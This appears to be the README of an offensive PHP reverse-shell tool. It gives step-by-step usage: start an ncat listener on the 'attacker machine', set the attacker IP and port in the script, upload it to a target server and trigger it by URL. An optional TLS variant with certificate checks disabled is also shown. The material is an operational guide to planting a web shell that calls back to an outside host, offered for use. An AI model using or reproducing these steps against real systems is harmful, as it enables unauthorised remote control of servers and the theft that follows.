simple PHP Reverse Shell — NZRXHX

## Features

- Fully functional reverse shell over TCP
- Compatible with Linux and Windows (auto-detects shell)
- Minimal dependencies — pure PHP
- Forks to background (daemonizes) when possible
- Stable stream handling (fixed `feof()` false positives)
- Keep-alive mechanism to maintain long-lived connections

---

## Usage

# 1. Start Listener

On your **attacker machine**, start a listener:
```bash
ncat -lvnp 443
```
You may replace 443 with another port.

# 2. Edit Script

Modify the following values in the PHP script:
```php
$remote_host = 'YOUR_IP';
$remote_port = 443;
$allowed_hosts = ['YOUR_IP'];
```

# 3. Upload and Execute

Upload the PHP script to the target system and trigger it via a web request:

http://target.com/shell.php

Optional: TLS (SSL) Support

## If using a TLS listener:

```bash
ncat --ssl -lvnp 443
```
Then change this line in the script:
```php
$socket = stream_socket_client("tcp://...");
```
to:
```php
$context = stream_context_create([
  'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
]);
$socket = stream_socket_client("ssl://$remote_host:$remote_port", $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $context);
```
